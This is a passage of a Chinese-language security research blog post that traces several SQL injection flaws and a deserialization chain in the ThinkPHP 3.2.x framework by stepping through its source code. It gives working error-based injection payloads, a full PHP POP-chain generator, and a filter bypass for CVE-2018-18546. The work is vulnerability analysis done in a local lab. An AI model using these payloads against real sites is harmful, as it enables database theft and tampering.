&#123;                        $this-&gt;_parseType($options[&#39;where&#39;], $key);                    &#125;                &#125; elseif (!is_numeric($key) &amp;&amp; &#39;_&#39; != substr($key, 0, 1) &amp;&amp; false === strpos($key, &#39;.&#39;) &amp;&amp; false === strpos($key, &#39;(&#39;) &amp;&amp; false === strpos($key, &#39;|&#39;) &amp;&amp; false === strpos($key, &#39;&amp;&#39;)) &#123;                    if (!empty($this-&gt;options[&#39;strict&#39;])) &#123;                        E(L(&#39;_ERROR_QUERY_EXPRESS_&#39;) . &#39;:[&#39; . $key . &#39;=&gt;&#39; . $val . &#39;]&#39;);                    &#125;                    unset($options[&#39;where&#39;][$key]);                &#125;            &#125;        &#125;</code></pre><p>其中<code>_parseType()</code>函数</p><pre><code class="php">protected function _parseType(&amp;$data, $key)    &#123;        if (!isset($this-&gt;options[&#39;bind&#39;][&#39;:&#39; . $key]) &amp;&amp; isset($this-&gt;fields[&#39;_type&#39;][$key])) &#123;            $fieldType = strtolower($this-&gt;fields[&#39;_type&#39;][$key]);            if (false !== strpos($fieldType, &#39;enum&#39;)) &#123;                // 支持ENUM类型优先检测            &#125; elseif (false === strpos($fieldType, &#39;bigint&#39;) &amp;&amp; false !== strpos($fieldType, &#39;int&#39;)) &#123;                $data[$key] = intval($data[$key]);            &#125; elseif (false !== strpos($fieldType, &#39;float&#39;) || false !== strpos($fieldType, &#39;double&#39;)) &#123;                $data[$key] = floatval($data[$key]);            &#125; elseif (false !== strpos($fieldType, &#39;bool&#39;)) &#123;                $data[$key] = (bool) $data[$key];            &#125;        &#125;    &#125;</code></pre><p>在这把id进行了强制类型转换，然后返回给<code>_parseOptions()</code>，最终带入<code>$this-&gt;db-&gt;select($options)</code>进行查询避免了注入问题。</p><p>理一下 传入<code>id=1 </code>-&gt; <code>I()</code> -&gt; <code>find()</code> -&gt; <code>_parseOptions()</code> -&gt; <code>_parseType()</code> 然后将我们的字符串清理了。 要知道id参数被改变的时间点在<code>_parseType()</code>中，那进入这个方法要满足</p><pre><code class="php">if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;]))</code></pre><p>​<img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703204546122.png" alt="image-20230703204546122"></p><p>然后使用报错注入</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703204642573.png" alt="image-20230703204642573"></p><h3 id="3-2-3-exp注入"><a href="#3-2-3-exp注入" class="headerlink" title="3.2.3 exp注入"></a>3.2.3 exp注入</h3><p>配置控制器</p><pre><code class="php">public function index()&#123;    $User = D(&#39;Users&#39;);    $map = array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;]);    // $map = array(&#39;username&#39; =&gt; I(&#39;username&#39;));    $user = $User-&gt;where($map)-&gt;find();    var_dump($user);&#125;</code></pre><p>测试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703213910460.png" alt="image-20230703213910460"></p><p>调试:</p><p><code>username=aaa</code> –&gt; <code>find()</code>,运行到select()这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214601265.png" alt="image-20230703214601265"></p><p>跟进</p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code> ,</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214650903.png" alt="image-20230703214650903"></p><p>根进<code>buildSelectSql</code></p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214849497.png" alt="image-20230703214849497"></p><p>没有进入if判断，直接执行<code>parseSql()</code>,跟进查看</p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code></p><pre><code class="php">public function parseSql($sql, $options = array())    &#123;        $sql = str_replace(            array(&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;),            array(                $this-&gt;parseTable($options[&#39;table&#39;]),                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;]) ? $options[&#39;distinct&#39;] : false),                $this-&gt;parseField(!empty($options[&#39;field&#39;]) ? $options[&#39;field&#39;] : &#39;*&#39;),                $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;),                $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;),                $this-&gt;parseGroup(!empty($options[&#39;group&#39;]) ? $options[&#39;group&#39;] : &#39;&#39;),                $this-&gt;parseHaving(!empty($options[&#39;having&#39;]) ? $options[&#39;having&#39;] : &#39;&#39;),                $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;),                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;),                $this-&gt;parseUnion(!empty($options[&#39;union&#39;]) ? $options[&#39;union&#39;] : &#39;&#39;),                $this-&gt;parseLock(isset($options[&#39;lock&#39;]) ? $options[&#39;lock&#39;] : false),                $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;),                $this-&gt;parseForce(!empty($options[&#39;force&#39;]) ? $options[&#39;force&#39;] : &#39;&#39;),            ), $sql);        return $sql;    &#125;</code></pre><p>部分是通过<code>parse</code>系列函数来构建SQL语句，关注点在<code>parseWhere()</code>函数，跟进到parseWhere()里面</p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code>–&gt;<code>parseWhere()</code></p><p>在parseWhere()里无论进行什么操作，都会进入<code>parseWhereItem</code>,</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703220403708.png" alt="image-20230703220403708"></p><p>进入<code>parseWhereItem</code></p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code>–&gt;<code>parseWhere()</code> –&gt; <code>parseWhereItem()</code></p><p>在这个方法里，发现直接拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703221843199.png" alt="image-20230703221843199"></p><p>但是需要满足条件才能进入这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222022145.png" alt="image-20230703222022145"></p><p>构造payload，调试一下</p><pre><code>?username[0]=exp&amp;username[1]=1</code></pre><p>成功进入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222152915.png" alt="image-20230703222152915"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222237736.png" alt="image-20230703222237736"></p><p>成功拼接，但是拼接结果是</p><pre><code>`username`1</code></pre><p>缺少了<code>=</code></p><p>payload</p><pre><code>?username[0]=exp&amp;username[1]==1</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222625578.png" alt="image-20230703222625578"></p><p>测试单引号，出现报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222855437.png" alt="image-20230703222855437"></p><p>直接报错注入</p><pre><code>?username[0]=exp&amp;username[1]==1 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703223003151.png" alt="image-20230703223003151"></p><p>在开头的控制器中，使用了</p><pre><code class="php">$map = array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;]);</code></pre><p>而不是</p><pre><code class="php">$map = array(&#39;username&#39; =&gt; I(&#39;username&#39;));</code></pre><p>因为<code>I()</code>方法中存在安全过滤,<code>EXP</code>被过滤了</p><pre><code class="php">function think_filter(&amp;$value)&#123;    // TODO 其他安全过滤    // 过滤查询特殊字符if (preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) &#123;        $value .= &#39; &#39;;&#125;</code></pre><h3 id="3-2-3-bind注入"><a href="#3-2-3-bind注入" class="headerlink" title="3.2.3 bind注入"></a>3.2.3 bind注入</h3><p>控制器配置：这个控制器是指根据id修改对应的password</p><pre><code class="php">public function index()&#123;    $User = M(&quot;Users&quot;);    $user[&#39;id&#39;] = I(&#39;id&#39;);    $data[&#39;password&#39;] = I(&#39;password&#39;);    $valu = $User-&gt;where($user)-&gt;save($data);    var_dump($valu);&#125;</code></pre><p>测试：</p><pre><code>http://127.0.0.1/index.php?id=1&amp;password=aabb</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704091236162.png" alt="image-20230704091236162"></p><p>调试过程：</p><p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code></p><p><code>sava</code>方法前面进行数据处理，和表达式分析，后面会运行到<code>updata()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704103705460.png" alt="image-20230704103705460"></p><p>跟进查看</p><p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code></p><pre><code class="php">public function update($data, $options)    &#123;        $this-&gt;model = $options[&#39;model&#39;];        $this-&gt;parseBind(!empty($options[&#39;bind&#39;]) ? $options[&#39;bind&#39;] : array());        $table = $this-&gt;parseTable($options[&#39;table&#39;]);        $sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);        if (strpos($table, &#39;,&#39;)) &#123;// 多表更新支持JOIN操作            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;);        if (!strpos($table, &#39;,&#39;)) &#123;            //  单表更新支持order和lmit            $sql .= $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;)            . $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;);        return $this-&gt;execute($sql, !empty($options[&#39;fetch_sql&#39;]) ? true : false);    &#125;</code></pre><p>这里看到了熟悉的<code>parseWhere()</code>,在这之前,<code>$sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);</code>会构建出部分sql语句</p><p>但是sql语句是</p><pre><code>UPDATE `users` SET `password`=:0</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704104828201.png" alt="image-20230704104828201"></p><p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code> –&gt;<code>parseWhere()</code>–&gt;<code>parseWhereItem()</code></p><p>这里的和上面exp注入差不多，想办法进入<code>bind</code>分支</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105214858.png" alt="image-20230704105214858"></p><p>和exp注入一样修改get数据后成功进入</p><pre><code>?id[0]=bind&amp;id[1]=1&amp;password=admin123</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105506703.png" alt="image-20230704105506703"></p><p>查看拼接后最后sql语句,这里就很有问题，反正我目前还没见过</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105612143.png" alt="image-20230704105612143"></p><p><code>parseWhere()</code>执行完后得到了奇怪的sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105811692.png" alt="image-20230704105811692"></p><p>在执行sql语句前的状态</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704110047806.png" alt="image-20230704110047806"></p><p>跟进<code>execute()</code>查看</p><p><code>id[0]=bind&amp;id[1]=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code> —&gt;<code>execute()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704110455049.png" alt="image-20230704110455049"></p><p>在这条代码里</p><pre><code class="php">$this-&gt;queryStr = strtr($this-&gt;queryStr, array_map(function ($val) use ($that) &#123;return &#39;\&#39;&#39; . $that-&gt;escapeString($val) . &#39;\&#39;&#39;;&#125;, $this-&gt;bind))</code></pre><p>array_map()是执行function,$this-&gt;bind为function的参数</p><p>strtr()  把$this-&gt;queryStr字符串里面的</p><p>整个过程将</p><pre><code>UPDATE `users` SET `password`=:0 WHERE `id` = :1</code></pre><p>修改为</p><pre><code>UPDATE `users` SET `password`=&#39;admin123&#39; WHERE `id` = :1</code></pre><p><code>:0</code>变成了<code>admin123</code>,就是<code>$this-&gt;bind</code>，但是<code>:1</code>没变</p><p>如果get的是<code>id[0]=bind&amp;id[1]=0</code>,sql语句变成</p><pre><code>UPDATE `users` SET `password`=:0 WHERE `id` = :0</code></pre><p>经过替换后得到最终的sql语句</p><pre><code>UPDATE `users` SET `password`=&#39;admin123&#39; WHERE `id` = &#39;admin123&#39;</code></pre><p>然后执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704111630574.png" alt="image-20230704111630574"></p><p>因为整个过程中并没有对id进行过滤，只有一个<code>:0</code>替换，<code>id[1]=0</code>后面的拼接没有处理</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704112103271.png" alt="image-20230704112103271"></p><p>直接进行报错注入即可</p><pre><code>http://127.0.0.1/index.php?id[0]=bind&amp;password=admin123&amp;id[1]=0 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704112211737.png" alt="image-20230704112211737"></p><h3 id="3-2-3-order-by注入"><a href="#3-2-3-order-by注入" class="headerlink" title="3.2.3  order by注入"></a>3.2.3  order by注入</h3><p>先在2.3.4跟新的地方，发现parseOrder存在大量跟新,漏洞大概率出现在这</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704125431131.png" alt="image-20230704125431131"></p><p>控制器：</p><pre><code class="PHP"> public function index()&#123;        $username = I(&quot;username&quot;);        $order = I(&quot;order&quot;);        $data = M(&quot;users&quot;)-&gt;where(array(&quot;username&quot;=&gt;$username))-&gt;order($order)-&gt;find();        dump($data);    &#125;</code></pre><p>M只是实例化users对象，不管了，where也不是我们的利用点，我们也没对其进行操作，因此也跳过</p><p><strong>疑问： order($order)是干嘛的？</strong>，只知道是给$order赋值</p><p><code>username=admin&amp;order=1</code> –&gt;<code>find()</code>–&gt;<code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code></p><p>在这里找到了<code>parseOrder</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704131151548.png" alt="image-20230704131151548"></p><p>跟进<code>parseOrder</code></p><pre><code class="php">protected function parseOrder($order)    &#123;        if (is_array($order)) &#123;            $array = array();            foreach ($order as $key =&gt; $val) &#123;                if (is_numeric($key)) &#123;                    $array[] = $this-&gt;parseKey($val);                &#125; else &#123;                    $array[] = $this-&gt;parseKey($key) . &#39; &#39; . $val;                &#125;            &#125;            $order = implode(&#39;,&#39;, $array);        &#125;        return !empty($order) ? &#39; ORDER BY &#39; . $order : &#39;&#39;;    &#125;</code></pre><p>这里首先会判断$order是不是数组，如果不是，返回拼接，如果$order不为空，则拼接ORDER BY</p><p>因为没有过滤，造成了sql注入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704131936741.png" alt="image-20230704131936741"></p><p>这里可以直接注入了</p><pre><code>?username=admin&amp;order=1 and updatexml(1,concat(0x3a,database()),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704132307868.png" alt="image-20230704132307868"></p><h3 id="3-2-3-update注入"><a href="#3-2-3-update注入" class="headerlink" title="3.2.3  update注入"></a>3.2.3  update注入</h3><p> 看来网上的分析文章，其实就是上面分析的bind注入</p><h3 id="3-2-3-delete注入"><a href="#3-2-3-delete注入" class="headerlink" title="3.2.3  delete注入"></a>3.2.3  delete注入</h3><p>(感觉还是where注入)</p><p>控制器：</p><pre><code class="php">public function index()&#123;        $id = I(&quot;id&quot;);        $res = M(&quot;users&quot;)-&gt;delete($id);    &#125;</code></pre><p><code>id=5</code>–&gt;<code>delete()</code>–&gt;<code>delete()</code></p><p>在这个方法里也是调用了一系列的parse方法，去构建sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704141846044.png" alt="image-20230704141846044"></p><p><code>id=5</code>–&gt;<code>delete()</code>–&gt;<code>delete()</code>–&gt;<code>parseWhere()</code>–&gt;<code>parseWhereItem()</code></p><p>经过这个方法后会构建出<code>WHERE id=5</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704142845933.png" alt="image-20230704142845933"></p><p>尝试直接注入，得到奇怪的语句</p><pre><code>id= 5%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704143310018.png" alt="image-20230704143310018"></p><p>查看<code>parseWhere()</code>，如果传进的参数如果是字符串，而不是数组，就不会进入else，产生那个奇怪的sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704143837865.png" alt="image-20230704143837865"></p><p><code>id[where]=5</code>,这个能进入if判断</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144109802.png" alt="image-20230704144109802"></p><p>然后直接跳转到最后的拼接，得到<code>where 5</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144143733.png" alt="image-20230704144143733"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144231873.png" alt="image-20230704144231873"></p><p>然后就进行注入尝试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144328843.png" alt="image-20230704144328843"></p><p>似乎可以，报错注入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144425948.png" alt="image-20230704144425948"></p><pre><code>http://127.0.0.1/index.php?id[where]=5 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><h3 id="3-2-3-反序列化"><a href="#3-2-3-反序列化" class="headerlink" title="3.2.3 反序列化"></a>3.2.3 反序列化</h3><p>(感觉还是sql注入)</p><p>控制器:</p><pre><code class="php">public function index()&#123;    unserialize(base64_decode($_GET[&#39;ser&#39;]));&#125;</code></pre><p>先找<code>__destruct</code>,因为这个魔法方法当反序列化时先调用，全局搜索后,</p><p>找到<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p><pre><code class="php"> public function __destruct()    &#123;        empty($this-&gt;img) || $this-&gt;img-&gt;destroy();    &#125;</code></pre><p>这个img可以控制</p><p>下一步就行找到一个能够调用<code>destroy</code>的类</p><p>在<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p><pre><code class="php">public function destroy($sessID)&#123;        return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);&#125;</code></pre><p>$this-&gt;handle可控，但是这是有参函数，在php7调用有参函数时不传参数会触发框架里的错误处理，切换php5就行</p><p>下一步，找到delete()方法，在<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><pre><code class="php">public function delete($options = array())    &#123;          &#125;</code></pre><p>这个就是前面分析sql注入的delete方法</p><p>里面会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>的delete方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704153926320.png" alt="image-20230704153926320"></p><pre><code>public function delete($options = array())    &#123;        $this-&gt;model = $options[&#39;model&#39;];        $this-&gt;parseBind(!empty($options[&#39;bind&#39;]) ? $options[&#39;bind&#39;] : array());        $table = $this-&gt;parseTable($options[&#39;table&#39;]);        $sql   = &#39;DELETE FROM &#39; . $table;        if (strpos($table, &#39;,&#39;)) &#123;// 多表删除支持USING和JOIN操作            if (!empty($options[&#39;using&#39;])) &#123;                $sql .= &#39; USING &#39; . $this-&gt;parseTable($options[&#39;using&#39;]) . &#39; &#39;;            &#125;            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;);        if (!strpos($table, &#39;,&#39;)) &#123;            // 单表删除支持order和limit            $sql .= $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;)            . $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;);        return $this-&gt;execute($sql, !empty($options[&#39;fetch_sql&#39;]) ? true : false);    &#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704154233230.png" alt="image-20230704154233230"></p><p>这里存在一个sql语句直接拼接，而且在前面的分析中没有对参数过滤，可以尝试用反序列化链造成sql注入</p><p>在执行sql语句时，会调用<code>initConnect</code>进行初始化连接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704154710379.png" alt="image-20230704154710379"></p><p>跟进<code>initConnect</code>,</p><pre><code class="php">protected function initConnect($master = true)    &#123;        if (!empty($this-&gt;config[&#39;deploy&#39;]))        // 采用分布式数据库        &#123;            $this-&gt;_linkID = $this-&gt;multiConnect($master);        &#125; else        // 默认单数据库        if (!$this-&gt;_linkID) &#123;            $this-&gt;_linkID = $this-&gt;connect();        &#125;    &#125;</code></pre><p>跟进connect,这个$this-&gt;config可控</p><pre><code class="php">public function connect($config = &#39;&#39;, $linkNum = 0, $autoConnection = false)    &#123;        if (!isset($this-&gt;linkID[$linkNum])) &#123;            if (empty($config)) &#123;                $config = $this-&gt;config;            &#125;            try &#123;                if (empty($config[&#39;dsn&#39;])) &#123;                    $config[&#39;dsn&#39;] = $this-&gt;parseDsn($config);                &#125;                if (version_compare(PHP_VERSION, &#39;5.3.6&#39;, &#39;&lt;=&#39;)) &#123;                    // 禁用模拟预处理语句                    $this-&gt;options[PDO::ATTR_EMULATE_PREPARES] = false;                &#125;                $this-&gt;linkID[$linkNum] = new PDO($config[&#39;dsn&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;], $this-&gt;options);            &#125; catch (\PDOException $e) &#123;                if ($autoConnection) &#123;                    trace($e-&gt;getMessage(), &#39;&#39;, &#39;ERR&#39;);                    return $this-&gt;connect($autoConnection, $linkNum);                &#125; elseif ($config[&#39;debug&#39;]) &#123;                    E($e-&gt;getMessage());                &#125;            &#125;        &#125;        return $this-&gt;linkID[$linkNum];    &#125;</code></pre><p>按照思路，构造POP链</p><pre><code>__destruct()-&gt;destroy()-&gt;delete()-&gt;Driver::delete()-&gt;Driver::execute()-&gt;Driver::initConnect()-&gt;Driver::connect()</code></pre><pre><code class="php">&lt;?php//初始化数据库连接namespace Think\Db\Driver&#123;    use PDO;    class Mysql&#123;        protected $config = array(            &quot;debug&quot;    =&gt; 1,            &quot;database&quot; =&gt; &quot;thinkphp&quot;,//数据库名            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,//地址            &quot;hostport&quot; =&gt; &quot;3306&quot;,//端口            &quot;charset&quot;  =&gt; &quot;utf8&quot;,            &quot;username&quot; =&gt; &quot;root&quot;,//用户名            &quot;password&quot; =&gt; &quot;123456&quot;//密码        );    &#125;&#125;namespace Think\Image\Driver&#123;    use Think\Session\Driver\Memcache;    class Imagick&#123;        private $img;        public function __construct()&#123;            $this-&gt;img = new Memcache();        &#125;    &#125;&#125;namespace Think\Session\Driver&#123;    use Think\Model;    class Memcache&#123;        protected $handle;        public function __construct()&#123;            $this-&gt;handle = new Model();        &#125;    &#125;&#125;namespace Think&#123;    use Think\Db\Driver\Mysql;    class Model&#123;        protected $options   = array();        protected $pk;        protected $data = array();        protected $db = null;        public function __construct()&#123;            $this-&gt;db = new Mysql();            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;            $this-&gt;pk = &#39;id&#39;;            $this-&gt;data[$this-&gt;pk] = array(                &quot;table&quot; =&gt; &quot;users where 1 and updatexml(1,concat(0x7e,database(),0x7e),1)#&quot;,                &quot;where&quot; =&gt; &quot;1=1&quot;            );        &#125;    &#125;&#125;namespace &#123;    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));&#125;</code></pre><h3 id="3-2-4-CVE-2018-18546（上面Order-by注入的绕过）"><a href="#3-2-4-CVE-2018-18546（上面Order-by注入的绕过）" class="headerlink" title="3.2.4 CVE-2018-18546（上面Order by注入的绕过）"></a>3.2.4 CVE-2018-18546（上面Order by注入的绕过）</h3><p>控制器：</p><pre><code class="php">public function index()    &#123;        $obj = M(&#39;users&#39;);        $res = $obj-&gt;where(&#39;id=1&#39;)-&gt;order(I(&#39;id&#39;))-&gt;select();        echo $obj-&gt;getLastSql();//输出sql语句    &#125;</code></pre><p>描述：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707202352932.png" alt="image-20230707202352932"></p><p>版本:3.2.4和3.2.5对比</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707202509308.png" alt="image-20230707202509308"></p><p>这部分代码是漏洞出现的地方，也就是对order拼接前进行过滤处理的地方</p><pre><code class="php">foreach (explode(&#39;,&#39;, $order) as $val) &#123;     if (preg_match(&#39;/\s+(ASC|DESC)$/i&#39;, rtrim($val), $match, PREG_OFFSET_CAPTURE)) &#123;            $array[] = $this-&gt;parseKey(ltrim(substr($val, 0, $match[0][1]))) . &#39; &#39; . $match[1][0];       &#125; elseif (false === strpos($val, &#39;(&#39;)) &#123;            $array[] = $this-&gt;parseKey($val);        &#125;</code></pre><p>这个代码首先将$order进行以逗号<code>,</code>进行分割为数组，然后遍历这个数组</p><p>然后按照不同规则进行处理，</p><p>第一个是使用 <code>rtrim</code> 函数去除 <code>$val</code> 右侧的空格，并将结果作为 <code>preg_match</code> 函数的第二个参数。匹配结果将存储在数组 <code>$match</code> 中，然后使用 <code>substr</code> 函数截取出 <code>$val</code> 中 <code>$match[0][1]</code> 之前的部分（即去除了 <code>ASC</code> 或 <code>DESC</code> 部分），然后使用 <code>ltrim</code> 函数去除左侧的空格。使用 <code>$this-&gt;parseKey</code> 方法对处理后的部分进行进一步解析，并将结果与匹配到的排序方式（<code>ASC</code> 或 <code>DESC</code>）拼接成字符串，最后将其添加到数组 <code>$array</code> 中。</p><p>第二个是使用 <code>strpos</code> 函数检查 <code>$val</code> 中是否包含左括号 <code>&#39;(&#39;</code>。如果不包含，则执行以下代码块。这里调用了 <code>$this-&gt;parseKey</code> 方法对 <code>$val</code> 进行解析，并将解析结果添加到数组 <code>$array</code> 中</p><p>确保前面没有过滤后，直接在这段代码进行下断点调试：</p><pre><code>输入：?id=updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211520419.png" alt="image-20230707211520419"></p><p>这个会被分割为</p><pre><code>[&#39;updatexml(1&#39;,&#39;concat(0x7e&#39;,&#39;database()&#39;,&#39;0x7e)&#39;,&#39;1)]</code></pre><p>经过过滤处理最终满足条件的就只有最后两个</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707210348075.png" alt="image-20230707210348075"></p><p>为了让数组中每一位都能满足条件需要进行绕过：存在<code>(</code>的，使用sql语句中的注释进行绕过，在注释中添加<code>ASC</code>或者<code>DESC</code>，使得它走的是第一个if</p><p>不存在<code>(</code>的，适当构建<code>/**/</code>和<code>,</code> ,为了构造分割和sql语句注释的完整</p><pre><code>[&#39;updatexml(1&#39;,&#39;concat(0x7e&#39;,&#39;database()&#39;,&#39;0x7e)&#39;,&#39;1)]</code></pre><p> 处理后的数组：</p><pre><code>[&#39;updatexml/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/1&#39;,&#39;concat/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/0x7e&#39;,&#39;database/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/)&#39;,&#39;0x7e)&#39;,&#39;1)]</code></pre><p>最后的payload：</p><pre><code>updatexml/*,*/(/*%20ASC,*/1,concat/*,*/(/*%20ASC,*/0x7e,database/*,*/(/*%20ASC,*/),0x7e),1)</code></pre><p>成功绕过：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211835078.png" alt="image-20230707211835078"></p><p>后面就是将order拼接<code>ORDER BY</code> 拼接到sql语句中执行了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211923350.png" alt="image-20230707211923350"></p><h3 id="3-2-4-CVE-2018-18529"><a href="#3-2-4-CVE-2018-18529" class="headerlink" title="3.2.4 CVE-2018-18529"></a>3.2.4 CVE-2018-18529</h3><p>漏洞描述：ThinkPHP 3.2.4存在SQL注入漏洞，该漏洞是由于Library&#x2F;Think&#x2F;Db&#x2F;Driver&#x2F;Mysql.class.php文件中的parseKey函数对key变量处理不当所致。注意：攻击URI中不需要使用反引号字符</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707212638957.png" alt="image-20230707212638957"></p><p>对比官方的修复:</p><p>这里是添加了对$key变量的过滤</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707213059131.png" alt="image-20230707213059131"></p><p>这个函数在sql相操作中频繁使用 